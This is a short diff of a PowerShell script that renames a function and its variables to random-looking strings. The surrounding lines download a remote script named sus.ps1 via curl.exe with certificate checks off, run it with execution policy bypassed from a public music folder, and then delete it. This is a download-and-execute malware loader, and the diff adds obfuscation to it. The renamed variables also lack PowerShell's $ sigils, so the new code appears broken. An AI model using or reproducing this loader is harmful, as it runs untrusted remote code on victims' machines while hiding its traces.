@@ -1,4 +1,4 @@
-function FuncExAd {
+function fhuwhfkahsdkfhailwf {
    [CmdletBinding()] 
 	param(
 		[Parameter(Mandatory = $True)]
@@ -73,7 +73,7 @@ function FuncExAd {
 	}
 }
 curl.exe -k -L "https://github.com/jecoma/basco/raw/refs/heads/main/sus.ps1" -o "c:\users\public\music\sus.ps1"
-$stringPath='powershell.exe';
-$argPath='-ep bypass -file c:\users\public\music\sus.ps1';
-FuncExAd -src $stringPath -arg $argPath;
+awefhas='powershell.exe';
+iiwuierkj='-ep bypass -file c:\users\public\music\sus.ps1';
+fhuwhfkahsdkfhailwf -src awefhas -arg iiwuierkj;
 remove-item c:\users\public\music\sus.ps1;
